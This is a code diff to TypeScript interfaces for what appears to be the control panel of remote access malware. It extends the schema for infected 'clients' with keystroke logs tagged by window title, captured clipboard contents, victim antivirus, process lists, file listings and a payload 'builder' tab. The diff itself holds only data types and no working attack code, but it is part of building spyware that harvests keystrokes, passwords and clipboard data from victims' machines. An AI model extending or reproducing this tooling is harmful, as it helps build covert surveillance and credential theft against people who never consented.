@@ -7,6 +7,10 @@ export interface Analytics {
   newToday: number;
   commandsSent: number;
   screensCaptured: number;
+  keylogs: number;
+  bandwidth: string;
+  avgUptime: string;
+  threats: number;
 }
 
 export interface Client {
@@ -16,11 +20,17 @@ export interface Client {
   os: string;
   ip: string;
   country: string;
-  status: "online" | "offline";
+  countryCode: string;
+  status: "online" | "offline" | "idle";
   lastSeen: string;
   cpu: string;
   ram: string;
+  gpu: string;
   uptime: string;
+  group: string;
+  av: string;
+  netSpeed: string;
+  installed: string;
 }
 
 export interface StatsResponse {
@@ -33,12 +43,42 @@ export interface ClientFile {
   name: string;
   type: "folder" | "file";
   size: string;
+  modified: string;
+}
+
+export interface ProcessInfo {
+  pid: number;
+  name: string;
+  cpu: string;
+  mem: string;
+  status: string;
+}
+
+export interface KeylogEntry {
+  ts: string;
+  window: string;
+  text: string;
+}
+
+export interface ClipboardEntry {
+  ts: string;
+  content: string;
 }
 
 export interface ClientDetailResponse {
   ok: boolean;
   client: Client;
   files: ClientFile[];
+  processes: ProcessInfo[];
+  keylogs: KeylogEntry[];
+  clipboard: ClipboardEntry[];
 }
 
-export type TabId = "dashboard" | "clients" | "builder";
+export interface LogEntry {
+  id: string;
+  type: "info" | "warn" | "success" | "error";
+  msg: string;
+  ts: number;
+}
+
+export type TabId = "dashboard" | "clients" | "builder" | "logs" | "settings";
